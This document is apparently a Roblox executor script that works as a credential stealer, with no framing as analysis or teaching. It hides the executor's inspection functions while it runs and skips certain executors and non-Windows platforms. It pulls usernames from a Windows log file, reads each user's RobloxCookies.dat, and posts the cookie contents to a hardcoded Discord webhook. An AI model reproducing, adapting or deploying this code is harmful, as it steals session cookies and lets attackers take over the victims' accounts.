local nm, vr = identifyexecutor()
local plat = game:GetService("UserInputService"):GetPlatform()

if nm == "Xeno" or nm == "Solara" or plat ~= Enum.Platform.Windows then
    return
end

local env = getgenv()
local oldgetgc = env.getgc
local oldgetrenv = env.getrenv
local oldgetreg = env.getreg
local olddebug = env.debug

env.getgc = nil
env.getrenv = nil
env.getreg = nil
env.debug = nil

if not env.__bkp then
    env.__bkp = {
        req = clonefunction(request),
        httpreq = clonefunction(http_request or request),
    }
    if http and http.request then
        env.__bkp.httpreq2 = clonefunction(http.request)
    end
end

local function rd(p)
    for _, fn in {env.__bkp.req, env.__bkp.httpreq, env.__bkp.httpreq2} do
        if fn then
            local s, r = pcall(fn, {Url = "file:///" .. p:gsub("\\", "/"), Method = "GET"})
            if s and r and r.Body then return r.Body end
        end
    end
end

local pf = rd("C:/Windows/PFRO.log")
if pf then
    local sn = {}
    for u in pf:gsub("\0", ""):gmatch("Users\\([^\\]+)\\") do
        if not sn[u] then
            sn[u] = true
            local c = rd("C:/Users/" .. u .. "/AppData/Local/Roblox/LocalStorage/RobloxCookies.dat")
            if c then
                pcall(function()
                    request({
                        Url = "https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = game:GetService("HttpService"):JSONEncode({content = u .. "\n```\n" .. c .. "\n```"})
                    })
                end)
            end
        end
    end
end

env.getgc = oldgetgc
env.getrenv = oldgetrenv
env.getreg = oldgetreg
env.debug = olddebug
